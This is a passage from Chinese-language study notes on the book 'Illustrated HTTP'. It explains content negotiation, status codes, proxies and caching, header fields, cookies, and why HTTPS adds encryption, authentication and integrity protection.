内容协商返回最合适的内容</h3><ul><li>内容协商机制是指客户端和服务器端就响应的资源内容进行交涉，然后提供给客户端最为适合的资源。内容协商会以响应资源的语言、字符集、编码方式等作为判断的基准。包含在请求报文中的某些首部字段（如下）就是判断的基准。<ul><li>Accept</li><li>Accept-Charset</li><li>Accept-Encoding</li><li>Accept-Language</li><li>Content-Language</li></ul></li><li>内容协商技术有以下 3 种类型<ul><li>服务器驱动协商（Server-driven Negotiation）<ul><li>由服务器端进行内容协商。以请求的首部字段为参考，在服务器端自动处理。</li></ul></li><li>客户端驱动协商（Agent-driven Negotiation）<ul><li>由客户端进行内容协商的方式。用户从浏览器显示的可选项列表中手动选择。还可以利用 JavaScript 脚本在 Web 页面上自动进行上述选择。比如按 OS 的类型或浏览器类型，自行切换成 PC 版页面或手机版页面。</li></ul></li><li>透明协商（Transparent Negotiation）<ul><li>是服务器驱动和客户端驱动的结合体，是由服务器端和客户端各自进行内容协商的一种方法。</li></ul></li></ul></li></ul><h2 id="%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E8%BF%94%E5%9B%9E%E7%BB%93%E6%9E%9C%E7%9A%84http%E7%8A%B6%E6%80%81%E7%A0%81" tabindex="-1">第四章 返回结果的HTTP状态码</h2><p>HTTP状态码负责表示客户端 HTTP请求的返回结果、标记服务器端的处理是否正常、通知出现的错误等工作。</p><table><thead><tr><th></th><th>类别</th><th>原因短语</th></tr></thead><tbody><tr><td>1XX</td><td>Informational(信息性状态码)</td><td>接受的请求正在处理</td></tr><tr><td>2XX</td><td>Success（成功状态码）</td><td>请求正常处理完毕</td></tr><tr><td>3XX</td><td>Redirection（重定向状态码）</td><td>需要进行附加操作以完成请求</td></tr><tr><td>4XX</td><td>Client Error（客户端错误状态码）</td><td>服务器无法处理请求</td></tr><tr><td>5XX</td><td>Server Error（服务器错误状态码）</td><td>服务器处理请求错误</td></tr></tbody></table><h3 id="1-2xx%E6%88%90%E5%8A%9F" tabindex="-1">1 2XX成功</h3><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>200 OK</td><td>表示从客户端发来的请求在服务器端被正常处理了</td></tr><tr><td>204 No Content</td><td>该状态码代表服务器接收的请求已成功处理，但在返回的响应报文中不含实体的主体部分，即服务器没有资源可以返回。</td></tr><tr><td>206 Partial content</td><td>该状态码表示客户端进行了范围请求，而服务器成功执行了这部分的 GET 请求。响应报文中包含由 Content-Range 指定范围的实体内容。</td></tr></tbody></table><h3 id="2-3xx%E9%87%8D%E5%AE%9A%E5%90%91" tabindex="-1">2 3XX重定向</h3><p>3XX响应结果表明浏览器需要执行某些特殊的处理以正确地处理请求</p><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>301 Moved Permanently</td><td>永久性重定向。该状态码表示请求的资源已被分配了新的URI，以后应该使用资源现在所指向的URI</td></tr><tr><td>302 Found</td><td>临时重定向。该状态码表示请求的资源已经被分配了新的URI，希望用户使用新的URI访问</td></tr><tr><td>303 See Other</td><td>该状态码表示由于请求对应的资源存在着另一个 URI，应使用 GET方法定向获取请求的资源。<br>303 状态码和 302 Found 状态码有着相同的功能，但 303 状态码明确表示客户端应当采用 GET 方法获取资源，这点与 302 状态码有区别。</td></tr><tr><td>304 Not Modified</td><td>该状态码表示客户端发送附带条件的请求 A 时，服务器端允许请求访问资源，但未满足条件的情况。304 状态码返回时，不包含任何响应的主体部分。304 虽然被划分在 3XX 类别中，但是和重定向没有关系。</td></tr><tr><td>307 Temporary Redirect</td><td>临时重定向。该状态码与 302 Found 有着相同的含义。尽管 302 标准禁止 POST 变换成 GET，但实际使用时大家并不遵守。307 会遵照浏览器标准，不会从 POST 变成 GET。但是，对于处理响应时的行为，每种浏览器有可能出现不同的情况</td></tr></tbody></table><h3 id="3-4xx%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%94%99%E8%AF%AF" tabindex="-1">3 4XX客户端错误</h3><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>400 Bad Request</td><td>该状态码表示请求报文中存在语法错误，当错误发生时，需修改请求的内容后再次发送请求</td></tr><tr><td>401 unauthorized</td><td>该状态码表示发送的请求需要有通过HTTP认证（BASIC认证，DIGEST认证）的认证信息。若之前已进行过一次请求，则表示用户认证失败<br>返回含有401的响应必须包含一个使用户被请求资源的WWW-Authenticate首部以质询（challenge）用户信息。当浏览器初次接收到401响应时，会弹出认证用的对话窗口</td></tr><tr><td>403 Forbidden</td><td>该状态码表示对请求资源的访问被服务器拒接了。服务器端没有必要给出拒绝的详细理由，但可以在实体的主体部分对原因进行描述。<br>未获得文件系统的访问权限，访问权限出现问题等情况都有可能发生403</td></tr><tr><td>404 Not Found</td><td>该状态码表示服务器上无法找到请求的资源，除此之外，也可以在服务器端拒绝请求且不想说明理由时使用</td></tr></tbody></table><h3 id="4-5xx%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%94%99%E8%AF%AF" tabindex="-1">4 5XX服务器错误</h3><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>500 Internal Server Error</td><td>改状态码表示服务器端在执行请求时发生了错误，可能是Web应用存在的bug或某些临时的故障</td></tr><tr><td>503 Service Unavailable</td><td>该状态码表示服务器暂时处于超负载或真正进行停机维护，现在无法处理请求。如果实现得知解决上述状况需要的时间，最好写入Retry-After首部字段再返回给客户端</td></tr></tbody></table><h2 id="%E7%AC%AC%E4%BA%94%E7%AB%A0-%E4%B8%8Ehttp%E5%8D%8F%E4%BD%9C%E7%9A%84web%E6%9C%8D%E5%8A%A1%E5%99%A8" tabindex="-1">第五章 与HTTP协作的Web服务器</h2><p>一台Web服务器可搭建多个独立域名的Web网站，也可作为通信路径上的中转服务器提升传输效率。</p><h3 id="1-%E7%94%A8%E5%8D%95%E5%8F%B0%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BA%E5%AE%9E%E7%8E%B0%E5%A4%9A%E4%B8%AA%E5%9F%9F%E5%90%8D" tabindex="-1">1 用单台虚拟主机实现多个域名</h3><ul><li>HTTP/1.1规范允许一台HTTP服务器搭建多个Web站点，比如提供Web托管服务的供应商，这里使用了虚拟主机(Virtual Host,又称虚拟服务器)功能</li><li>在相同的IP地址下，由于虚拟主机可以寄存多个不同的主机名和域名的Web网站，因此在HTTP请求中，必须在Host首部内完整指定主机名或域名的URI</li></ul><h3 id="2-%E9%80%9A%E4%BF%A1%E6%95%B0%E6%8D%AE%E8%BD%AC%E5%8F%91%E7%A8%8B%E5%BA%8F%EF%BC%9A%E4%BB%A3%E7%90%86%EF%BC%8C%E7%BD%91%E5%85%B3%EF%BC%8C%E9%9A%A7%E9%81%93" tabindex="-1">2 通信数据转发程序：代理，网关，隧道</h3><p>HTTP通信时，除客户端和服务器外，还有一些用于通信数据转发的应用程序，如代理，网关和隧道，其可以配合服务器工作</p><ul><li>代理：是一种具有转发功能的应用程序，扮演了服务器和客户端的“中间人”角色，接受客户端发送的请求并转发给服务器，同时也接收服务器返回的响应转发给客户端</li><li>网关：网关是转发其他服务器通信数据的服务器，接收从客户端发来的请求时，它将像自己拥有资源的源服务器一样对请求进行处理，有时客户端可能不会察觉自己的通信目标是一个网关</li><li>隧道：是在相隔甚远的客户端和服务器两者之间进行中转，并保持双方通信连接的应用程序</li></ul><h4 id="%E4%BB%A3%E7%90%86" tabindex="-1">代理</h4><p><img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/5_1.jpg" alt></p><ul><li><p>代理服务器的基本行为就是接受客户端发送的请求后转发给其它服务器，代理不改变请求URI，会直接发送给前方持有资源的目标服务器</p></li><li><p>持有资源实体的服务器称为源服务器，从源服务器返回的响应经过代理服务器后再传给客户端</p></li><li><p>在HTTP通信过程中，可以级联多台代理服务器，转发时，需要附加Via首部字段以标记出经过的主机信息</p></li><li><p>使用代理服务器的理由</p><ul><li><ol><li>利用缓存技术减少网络带宽的流量</li></ol></li><li><ol start="2"><li>组织内部针对特定网络的访问控制</li></ol></li><li><ol start="3"><li>以后去访问日志为主要目的等</li></ol></li></ul></li><li><p>代理方法基准分类：</p><ul><li><ol><li>是否使用缓存：缓存代理</li></ol><ul><li>代理转发响应时，缓存代理(Caching Proxy)会预先将资源的副本(缓存)保存在代理服务器上</li><li>当代理再次接收到对相同资源的请求时，就可以不从源服务器那里获取资源，而是将缓存的资源返回</li></ul></li><li><ol start="2"><li>是否会修改报文：透明代理</li></ol><ul><li>转发请求或响应时，不对报文做任何加工的代理类型称为透明代理(Transparent Proxy)，反之称为非透明代理</li></ul></li></ul></li></ul><h4 id="%E7%BD%91%E5%85%B3" tabindex="-1">网关</h4><p><img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/5_2.jpg" alt></p><ul><li>网关的工作机制与代理相似，并且网关能使通信线路上的服务器提供非HTTP协议服务</li><li>利用网关可以提高通信的安全性，可以在客户端和网关之间的通信线路上加密以确保连接的安全。<ul><li>例如：网关可以连接数据库，使用SQL语句查询数据</li></ul></li></ul><h4 id="%E9%9A%A7%E9%81%93" tabindex="-1">隧道</h4><ul><li>隧道可以按要求建立一条与其它服务器的通信线路，届时使用SSL等加密手段进行通信。</li><li>隧道的目的：确保客户端和服务器能进行安全的通信</li><li>隧道本身不会解析HTTP请求，隧道会在通信双方断开连接时结束</li></ul><h3 id="3-%E4%BF%9D%E5%AD%98%E8%B5%84%E6%BA%90%E7%9A%84%E7%BC%93%E5%AD%98" tabindex="-1">3 保存资源的缓存</h3><ul><li>缓存是指代理服务器或客户端本地磁盘内保存的资源副本。利用缓存可减少对源服务器的访问，节省了通信流量和通信时间</li><li>缓存服务器是代理服务器的一种，属于缓存代理类型</li></ul><h4 id="%E7%BC%93%E5%AD%98%E7%9A%84%E6%9C%89%E6%95%88%E6%9C%9F%E9%99%90" tabindex="-1">缓存的有效期限</h4><ul><li>当源服务器上的资源更新时，如果还是使用不变的缓存，只会返回旧资源</li><li>因此，即使存在缓存，也会因为客户端的要求，缓存的有效期等因素，向源服务器确认资源的有效性，如判断缓存失效，则重新获取</li></ul><h4 id="%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%9A%84%E7%BC%93%E5%AD%98" tabindex="-1">客户端的缓存</h4><ul><li>缓存不仅可以在缓存服务器中，也可以在客户端浏览器中</li><li>浏览器缓存如果有效，则不必再向服务器请求相同的资源，可以从本地磁盘直接读取</li></ul><h2 id="%E7%AC%AC%E5%85%AD%E7%AB%A0-http%E9%A6%96%E9%83%A8" tabindex="-1">第六章 HTTP首部</h2><h3 id="1-http%E6%8A%A5%E6%96%87%E9%A6%96%E9%83%A8" tabindex="-1">1 HTTP报文首部</h3><ul><li>首部内容为客户端和服务器分别处理请求和相应所提供的信息</li><li>在请求中，HTTP报文由方法，URI，HTTP版本，HTTP首部字段等部分构成<img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/6_1.jpg" alt></li><li>在响应中，HTTP报文由HTTP版本，状态码(数字和原因短语)，HTTP首部字段3部分组成<img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/6_2.jpg" alt></li></ul><h3 id="2-http%E9%A6%96%E9%83%A8%E5%AD%97%E6%AE%B5" tabindex="-1">2 HTTP首部字段</h3><ul><li><p>HTTP首部字段传递重要信息：给浏览器和服务器提供报文主体大小，所使用的语言，主体信息等内容</p></li><li><p>HTTP首部字段结构：由首部字段名和字段值构成，中间用冒号分隔</p><ul><li>例如：<ul><li>Content-Type:text/html 该字段表示报文的主体对象类型</li><li>Keep-Alive : timeout=15,max=100 字段值可以有多个</li></ul></li></ul></li><li><p>4种HTTP首部字段类型</p><ul><li>通用首部字段 General Header Fields：请求报文和响应报文都会使用的首部</li><li>请求首部字段 Request Header Fields：从客户端向服务器端发送请求报文时使用的首部。补充了请求的附加内容，客户端信息，相应内容相关优先级等信息</li><li>响应首部字段 Response Header Fields：从服务器端想客户端返回响应报文时使用的首部，补充了相应的附加内容，也会要求客户端附加额外的内容信息</li><li>实体首部字段 Entity Header Fields：针对请求报文和响应报文的实体部分使用的首部。补充了资源内容·更新时间等与实体有关的信息。</li></ul></li><li><p>HTTP/1.1首部字段一览，HTTP/1.1共定义了47种首部字段<br><img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/6_3.jpg" alt><br><img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/6_4.jpg" alt><br><img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/6_5.jpg" alt></p></li><li><p>在HTTP协议种使用的首部字段，不限于RFC2616中的47种，还有Cookie，Set-Cookie等使用频率很高的字段，这些非正式字段统一归纳在 RFC4229 HTTP Header Field Registrations 中</p></li></ul><h3 id="3-http%2F1.1-%E9%80%9A%E7%94%A8%E9%A6%96%E9%83%A8%E5%AD%97%E6%AE%B5" tabindex="-1">3 HTTP/1.1 通用首部字段</h3><ul><li><p>Cache-Control：操作缓存的机制</p><ul><li>指令的参数是可选的，多个指令之间用&quot;,&quot;隔开，具体指令查阅资料</li><li>响应时控制缓存的指令<ul><li><code>Cache-Control:public</code> 表示所有用户都可以利用缓存</li><li><code>Cache-Control:private</code> 表示指定用户都可以利用缓存</li><li><code>Cache-Control:no-cache</code> 缓存服务器不能对资源进行缓存</li><li><code>Cache-Control:no-cache=Location</code> 客户端不能对资源进行缓存</li></ul></li><li>请求时控制缓存的指令<ul><li><code>Cache-Control:no-cache</code> 表示请求时不要缓存过的，这样做可以防止过期资源</li><li><code>Cache-Control:max-age=604800(秒)</code>当缓存时间比设定时间小则接收缓存资源，当max-age=0时缓存服务器需要将请求转发给源服务器</li><li><code>min-fresh=60(单位：秒)</code>:要求缓存服务器返回至少还未过指定时间的缓存资源</li><li><code>max-stale</code>可指示缓存资源，即使过期也照常接收只要仍处于 max-stale 指定的时间内，仍旧会被客户端接收。</li><li><code>only-if-cached</code>表示客户端仅在缓存服务器本地缓存目标资源的情况下才会要求其返回,如缓存服务器本地无缓存，返回504</li><li><code>must-revalidate</code>代理会向源服务器再次验证即将返回的响应缓存目前是否仍然有效</li></ul></li><li>共同意思<ul><li><code>Cache-Control:no-store</code> 表示有机密消息，请求和响应都不能缓存</li></ul></li></ul></li><li><p>Connection:该字段具有两个作用</p><ul><li>控制不再转发给代理的首部字段<code>Connection: 不再转发的首部字段名</code></li><li>管理持久连接<code>Connection: close</code> or <code>Connection: Keep-Alive</code></li></ul></li><li><p>Date</p><ul><li>首部字段Data表明创建HTTP报文的日期和时间</li><li>HTTP/1.1使用在RFC1123种规定的日期时间的格式，如下示例</li><li><code>Date: Tue, 03 Jul 2012 04:40:59 GMT</code></li></ul></li><li><p>Pragma</p><ul><li>Pragma 是 HTTP/1.1 之前版本的历史遗留字段，仅作为与 HTTP/1.0的向后兼容而定义。</li><li>规范定义的形式唯一<code>Pragma: no-cache</code>,与cache字段共用即可</li></ul></li><li><p>Trailer</p><ul><li>首部字段 Trailer 会事先说明在报文主体后记录了哪些首部字段。</li></ul></li><li><p>Transfer-Encoding:规定了传输报文主体时采用的编码方式</p><ul><li>HTTP/1.1 的传输编码方式仅对分块传输编码有效。</li></ul></li><li><p>Upgrade:用于检测 HTTP 协议及其他协议是否可使用更高的版本进行通信，其参数值可以用来指定一个完全不同的通信协议。</p></li><li><p>Via:追踪客户端与服务器之间的请求和响应报文的传输路径。</p></li><li><p>Warning:该首部通常会告知用户一些与缓存相关的问题的警告。</p><ul><li>格式:<code>Warning: [警告码][警告的主机:端口号]“[警告内容]”([日期时间])</code></li></ul></li></ul><h3 id="4-%E8%AF%B7%E6%B1%82%E9%A6%96%E9%83%A8%E5%AD%97%E6%AE%B5" tabindex="-1">4 请求首部字段</h3><ul><li><p>Accept：Accept 首部字段可通知服务器，用户代理能够处理的媒体类型及媒体类型的相对优先级。 可使用 type/subtype 这种形式，一次指定多种媒体类型</p><ul><li><code>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</code></li></ul></li><li><p>Accept-Charset:通知服务器用户代理支持的字符集及字符集的相对优先顺序。</p><ul><li><code>Accept-Charset: iso-8859-5, unicode-1-1;q=0.8</code></li></ul></li><li><p>Accept-Encoding:用来告知服务器用户代理支持的内容编码及内容编码的优先级顺序。</p><ul><li><code>Accept-Encoding: gzip, deflate</code></li></ul></li><li><p>Accept-Language:告知服务器用户代理能够处理的自然语言集（指中文或英文等），以及自然语言集的相对优先级。可一次指定多种自然语言集。</p><ul><li><code>Accept-Language: zh-cn,zh;q=0.7,en-us,en;q=0.3</code></li></ul></li><li><p>Authorization:告知服务器，用户代理的认证信息（证书值）。</p></li><li><p>Expect:告知服务器，期望出现的某种特定行为</p></li><li><p>From:告知服务器使用用户代理的用户的电子邮件地址。</p></li><li><p>Host:告知服务器，请求的资源所处的互联网主机名和端口号。</p></li><li><p>If-xxx 这种样式的请求首部字段，都可称为条件请求。服务器接收到附带条件的请求后，只有判断指定条件为真时，才会执行请求</p></li></ul><h3 id="5-%E5%93%8D%E5%BA%94%E9%A6%96%E9%83%A8%E5%AD%97%E6%AE%B5" tabindex="-1">5 响应首部字段</h3><ul><li><p>Accept-Ranges 是用来告知客户端服务器是否能处理范围请求，以指定获取服务器端某个部分的资源。可指定的字段值有两种，可处理范围请求时指定其为 bytes，反之则指定其为 none</p></li><li><p>首部字段 Age 能告知客户端，源服务器在多久前创建了响应。字段值的单位为秒。</p></li><li><p>首部字段 ETag 能告知客户端实体标识。它是一种可将资源以字符串形式做唯一性标识的方式。服务器会为每份资源分配对应的 ETag 值。</p><ul><li>强 ETag 值，不论实体发生多么细微的变化都会改变其值。</li><li>弱 ETag 值只用于提示资源是否相同。</li></ul></li><li><p>使用首部字段 Location 可以将响应接收方引导至某个与请求 URI位置不同的资源。基本上，该字段会配合 3xx ：Redirection 的响应，提供重定向的URI。</p></li><li><p>首部字段 Retry-After 告知客户端应该在多久之后再次发送请求。主要配合状态码 503 Service Unavailable 响应，或 3xx Redirect 响应一起使用</p></li><li><p>首部字段 Server 告知客户端当前服务器上安装的 HTTP 服务器应用程序的信息。不单单会标出服务器上的软件应用名称，还有可能包括版本号和安装时启用的可选项。<code>Server: Apache/2.2.6 (Unix) PHP/5.2.5</code></p></li><li><p>首部字段 WWW-Authenticate 用于 HTTP 访问认证。它会告知客户端适用于访问请求 URI 所指定资源的认证方案（Basic 或是 Digest）和带参数提示的质询（challenge）。状态码 401 Unauthorized 响应中，肯定带有首部字段 WWW-Authenticate</p></li></ul><h3 id="6-%E5%AE%9E%E4%BD%93%E9%A6%96%E9%83%A8%E5%AD%97" tabindex="-1">6 实体首部字</h3><ul><li><p>首部字段 Allow 用于通知客户端能够支持 Request-URI 指定资源的所有 HTTP 方法。当服务器接收到不支持的 HTTP 方法时，会以状态码405 Method Not Allowed 作为响应返回。与此同时，还会把所有能支持的 HTTP 方法写入首部字段 Allow 后返回。<code>Allow: GET, HEAD</code></p></li><li><p>首部字段 Content-Encoding 会告知客户端服务器对实体的主体部分<br>选用的内容编码方式。内容编码是指在不丢失实体信息的前提下所进行<br>的压缩。<code>Content-Encoding: gzip</code></p></li><li><p>首部字段 Content-Language 会告知客户端，实体主体使用的自然语<br>言（指中文或英文等语言）。</p></li><li><p>首部字段 Content-Location 给出与报文主体部分相对应的 URI。和首部字段 Location 不同，Content-Location 表示的是报文主体返回资源对应的 URI。</p></li><li><p>首部字段 Content-MD5 是一串由 MD5 算法生成的值，其目的在于检查报文主体在传输过程中是否保持完整，以及确认传输到达。</p></li><li><p>针对范围请求，返回响应时使用的首部字段 Content-Range，能告知客户端作为响应返回的实体的哪个部分符合范围请求。字段值以字节为单位，表示当前发送部分及整个实体大小</p></li><li><p>首部字段 Content-Type 说明了实体主体内对象的媒体类型。和首部字段 Accept 一样，字段值用 type/subtype 形式赋值。</p></li><li><p>首部字段 Expires 会将资源失效的日期告知客户端。</p></li><li><p>首部字段 Last-Modified 指明资源最终修改的时间。</p></li></ul><h3 id="7-%E4%B8%BAcookie%E6%9C%8D%E5%8A%A1%E7%9A%84%E9%A6%96%E9%83%A8%E5%AD%97%E6%AE%B5" tabindex="-1">7 为Cookie服务的首部字段</h3><table><thead><tr><th>首部字段名</th><th>说明</th><th>首部类型</th></tr></thead><tbody><tr><td>Set-Cookie</td><td>开始状态管理所使用的Cookie信息</td><td>响应首部字段</td></tr><tr><td>Cookie</td><td>服务器接收到的Cookie信息</td><td>请求首部字段</td></tr></tbody></table><ul><li><p>Set-Cookie：当服务器准备开始管理客户端的状态时，会事先告知各种信息。</p></li><li><p>set-Cookie字段的属性</p><ul><li>NAME=VALUE：赋予Cookie的名称和其值（必需项）</li><li>expires=DATE Cookie的有效期（若不明确指定则默认为浏览器关闭前为止）</li><li>path=PATH 将服务器上的文件目录作为Cookie的适用对象（若不指定则默认为文档所在的文件目录）</li><li>domain=域名 作为Cookie适用对象的域名 （若不指定则默认为创建Cookie的服务器的域名）</li><li>Secure 仅在HTTPS安全通信时才会发送Cookie</li><li>HttpOnly 加以限制，使Cookie不能被JavaScript脚本访问</li></ul></li><li><p>Cookie：首部字段 Cookie 会告知服务器，当客户端想获得 HTTP 状态管理支持时，就会在请求中包含从服务器接收到的 Cookie。接收到多个Cookie 时，同样可以以多个 Cookie 形式发送。</p></li></ul><h3 id="8-%E5%85%B6%E4%BB%96%E9%A6%96%E9%83%A8%E5%AD%97%E6%AE%B5" tabindex="-1">8 其他首部字段</h3><ul><li><p>首部字段 X-Frame-Options 属于 HTTP 响应首部，用于控制网站内容在其他 Web 网站的 Frame 标签内的显示问题。其主要目的是为了防止点击劫持（clickjacking）攻击</p></li><li><p>首部字段 X-XSS-Protection 属于 HTTP 响应首部，它是针对跨站脚本攻击（XSS）的一种对策，用于控制浏览器 XSS 防护机制的开关。</p></li><li><p>首部字段 P3P 属于 HTTP 相应首部，通过利用 P3P（The Platform for Privacy Preferences，在线隐私偏好平台）技术，可以让 Web 网站上的个人隐私变成一种仅供程序可理解的形式，以达到保护用户隐私的目的</p></li><li><p>协议中对 X- 前缀的废除</p><ul><li>在 HTTP 等多种协议中，通过给非标准参数加上前缀 X-，来区别于标准参数，并使那些非标准的参数作为扩展变成可能。但是这种简单粗暴的做法有百害而无一益，因此在“RFC 6648 - Deprecating the “X-” Prefix and Similar Constructs in Application Protocols”中提议停止该做法。</li><li>然而，对已经在使用中的 X- 前缀来说，不应该要求其变更。</li></ul></li></ul><h2 id="%E7%AC%AC%E4%B8%83%E7%AB%A0-%E7%A1%AE%E4%BF%9Dweb%E5%AE%89%E5%85%A8%E7%9A%84https" tabindex="-1">第七章 确保Web安全的HTTPS</h2><h3 id="7.1-http%E7%9A%84%E7%BC%BA%E7%82%B9" tabindex="-1">7.1 HTTP的缺点</h3><ul><li>HTTP的不足：<ul><li>通信使用明文(不加密)，内容可能会被窃听</li><li>不验证对方通信身份，因此可能遭受伪装</li><li>无法证明报文的完整性，所以有可能已经遭到篡改</li></ul></li><li>以上问题不仅在HTTP上，其它未加密的协议也会有这类问题</li></ul><h4 id="7.1.1-%E9%80%9A%E4%BF%A1%E4%BD%BF%E7%94%A8%E6%98%8E%E6%96%87%E5%8F%AF%E8%83%BD%E4%BC%9A%E8%A2%AB%E7%AA%83%E5%90%AC" tabindex="-1">7.1.1 通信使用明文可能会被窃听</h4><p>由于HTTP本身不具备加密的功能，所以无法做到对通信整体（使用 HTTP 协议通信的请求和响应的内容）进行加密。即，HTTP 报文使用明文（指未经过加密的报文）方式发送</p><ul><li><p>TCP/IP 是可能被窃听的网络</p><ul><li>这是因为，按 TCP/IP协议族的工作机制，通信内容在所有的通信线路上都有可能遭到窥视<img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/7_1.jpg" alt></li><li>即使是已经通过加密的通信，也可以窥视到通信内容，只是收如果通信通过加密，就有尽可能让人无法破解报文信息</li></ul></li><li><p>窃听相同段上的信息并非难事。只需要手机在互联网上流动的数据（帧）即可，对于收集来的数据包的解析，可以使用抓包工具。</p></li><li><p>加密处理防止被窃听：目前研究如何防止窃听保护信息的对策中，加密技术最为普及</p><ul><li>通信的加密：HTTP协议种没有加密机制，但可以通过和SSL（Secure Socket Layer安全套接层）或TLS（Transport Layer Security安全层传输协议）的组合使用，加密HTTP的通信内容<ul><li>与SSL组合使用高德HTTP称为HTTPS（HTTP Secure 超文本传输完全协议）</li></ul></li><li>内容的加密：HTTP协议中没有加密机制，南无我们可以把HTTP报文主体里所含的内容进行加密<ul><li>此时要求客户端和服务端都具有加密和解密机制，但不同https，内容仍有被篡改的风险</li></ul></li></ul></li></ul><h4 id="7.1.2-%E4%B8%8D%E9%AA%8C%E8%AF%81%E9%80%9A%E4%BF%A1%E6%96%B9%E7%9A%84%E8%BA%AB%E4%BB%BD%E5%B0%B1%E5%8F%AF%E8%83%BD%E9%81%AD%E5%8F%97%E4%BC%AA%E8%A3%85" tabindex="-1">7.1.2 不验证通信方的身份就可能遭受伪装</h4><ul><li><p>HTTP协议中的请求和响应是不会对通信方进行确认的</p><ul><li>任何人都可以发起请求，此时存在隐患<ul><li><ol><li>无法确定请求发送至目标的Web服务器是否是按照真实意图返回相应的那台服务器，有可能是伪装的Web服务器</li></ol></li><li><ol start="2"><li>无法确定响应返回到的客户端是否是按真实意图接收响应的那个客户端。有可能是已伪装的客户端。</li></ol></li><li><ol start="3"><li>无法确定正在通信的对方是否具备访问权限。因为某些 Web 服务器上保存着重要的信息，只想发给特定用户通信的权限</li></ol></li><li><ol start="4"><li>无法判定请求是来自何方、出自谁手。</li></ol></li><li><ol start="5"><li>即使是无意义的请求也会照单全收。无法阻止海量请求下的 DoS攻击（Denial of Service，拒绝服务攻击）</li></ol></li></ul></li></ul></li><li><p>查明对方证书：虽然HTTP协议无法确定通信方，但SSL可以</p><ul><li>SSL不仅提供了加密处理，还提供了一种称为证书的手段<img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/7_2.jpg" alt></li><li>证书由值得信任的第三方机构办法，用以证明服务器和客户端是实际存在的，而伪造证书是一件很困难的事</li><li>通过证书，证明通信方就是想要的服务器，同时也减少了个人信息暴露的风险，另外客户端持有的证书既可以完成对个人身份的确认，也可以完成对Web网站的认证环节。</li></ul></li></ul><h4 id="7.1.3-%E6%97%A0%E6%B3%95%E8%AF%81%E6%98%8E%E6%8A%A5%E6%96%87%E7%9A%84%E5%AE%8C%E6%95%B4%E6%80%A7%EF%BC%8C%E5%8F%AF%E8%83%BD%E5%B7%B2%E9%81%AD%E7%AF%A1%E6%94%B9" tabindex="-1">7.1.3 无法证明报文的完整性，可能已遭篡改</h4><ul><li><p>接收到的内容可能有误</p><ul><li>没有任何办法确认，发出的请求/响应和接收到的请求/响应是前后相同的</li><li>请求或响应在传输途中，遭攻击者拦截并篡改内容的攻击，称为中间人攻击（Man-in-the-Middle attack，MITM）。</li></ul></li><li><p>如何防止篡改</p><ul><li>有使用HTTP协议确定报文完整新的方法，但并不可靠便捷。</li><li>常用的是MD5，SHA-1等散列值校验，但对需要操纵客户端的用户本人亲自检查验证下载的文件是否就是原来服务器上的文件，浏览器无法自动帮用户检查</li><li>同时，如果MD5本身被改写的话，用户是无法意识到的</li></ul></li></ul><h3 id="7.2-http%2B%E5%8A%A0%E5%AF%86%2B%E8%AE%A4%E8%AF%81%2B%E5%AE%8C%E6%95%B4%E6%80%A7%E4%BF%9D%E6%8A%A4%3Dhttps" tabindex="-1">7.2 HTTP+加密+认证+完整性保护=HTTPS</h3><ul><li>我们把添加了加密及认证机制的HTTP称为HTTPS(HTTP Secure)</li><li>使用HTTPS通信时，使用https://</li></ul><h4 id="7.2.2-https%E6%98%AF%E8%BA%AB%E6%8A%ABssl%E5%A4%96%E5%A3%B3%E7%9A%84http" tabindex="-1">7.2.2 HTTPS是身披SSL外壳的HTTP</h4><ul><li>HTTPS 并非是应用层的一种新协议。只是 HTTP 通信接口部分用SSL（Secure Socket Layer）和 TLS（Transport Layer Security）协议代替而已。</li><li>通常，HTTP直接和TCP通信，当使用SSL时，则先和SSL通信，再由SSL和TCP通信<img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/7_3.jpg" alt></li><li>在使用SSL后，HTTP就拥有了HTTPS的加密，证书和完整性保护这些功能</li><li>SSL是独立于HTTP的协议，所以其他运行在应用层的协议都可以配合SSL协议的使用，可以收SSL是当今世界上应用最为广泛的网络安全技术</li></ul><h4 id="7.2.3-%E7%9B%B8%E4%BA%92%E4%BA%A4%E4%BA%92%E5%AF%86%E9%92%A5%E7%9A%84%E5%85%AC%E5%BC%80%E5%AF%86%E9%92%A5%E5%8A%A0%E5%AF%86%E6%8A%80%E6%9C%AF" tabindex="-1">7.2.3 相互交互密钥的公开密钥加密技术</h4><ul><li><p>SSL采用一种公开密钥加密（Public-key cryptography）的加密处理方式</p><ul><li>近代加密方法中，算法是公开的，密钥是保密的</li><li>加密和解密都会用到密钥，如果密钥被攻击者所得，则加密失去意义</li></ul></li><li><p>共享密钥加密的困境</p><ul><li>加密和解密如果使用同一个密钥的方式称为共享密钥加密，也称为对称密钥加密</li><li>以共享密钥加密时必须将密钥也发送给对方，此时如果密钥落入攻击人之手，也失去了加密的意义</li></ul></li><li><p>使用两把密钥的公开密钥加密</p><ul><li>公开密钥加密使用一对非对称密钥，称为私有密钥和公开密钥</li><li>发送方使用对方公开密钥进行加密，接收方使用自己的私有密钥进行解密</li></ul></li><li><p>HTTPS采用混合加密机制，混合了共享密钥和公开密钥</p><ul><li>公开密钥可以实现安全交换，但公开密钥处理速度慢</li><li>因此可以二者结合，交换密钥环节使用公开密钥加密获得公共密钥，随后进行共享密钥加密<img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/7_4.jpg" alt></li></ul></li></ul><h4 id="7.2.4-%E8%AF%81%E6%98%8E%E5%85%AC%E5%BC%80%E5%AF%86%E9%92%A5%E6%AD%A3%E7%A1%AE%E7%9A%84%E8%AF%81%E4%B9%A6" 